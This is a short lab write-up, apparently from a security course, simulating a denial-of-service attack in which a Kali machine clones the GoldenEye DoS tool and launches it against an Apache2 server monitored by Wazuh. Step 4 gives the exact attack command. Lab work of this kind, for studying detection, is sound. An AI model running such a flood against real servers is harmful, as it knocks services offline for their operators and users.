# Attack Simulation – GoldenEye

## Environment
- **Attacker:** Kali Linux
- **Target:** Ubuntu-Agent (Apache2 Web Server)
- **SIEM/IDS:** Wazuh 

## Steps

- **Step 1:** Kali Linux system updates and basic network tools installed. 
  (See Figure 9.1)

	sudo apt update && sudo apt upgrade -y
	sudo apt install net-tools curl wget htop -y

- **Step 2:** GoldenEye DoS tool cloned and installed. 
  (See Figure 9.2)

	git clone https://github.com/jseidl/GoldenEye.git	

- **Step 3:** Apache2 Web Server installed and activated on Ubuntu-Agent. 
  (See Figure 9.3 & 9.4)

	sudo apt update && sudo apt install apache2 -y
	sudo systemctl start apache2
	sudo systemctl enable apache2

- **Step 4:** GoldenEye launched against the web server. 
  (See Figure 9.5 & 9.6) 
	
	cd GoldenEye
	python3 goldeneye.py http://192.168.185.70 -w 10 -s 100

	
## Notes
GoldenEye was used strictly for academic and research purposes within a controlled lab environment.
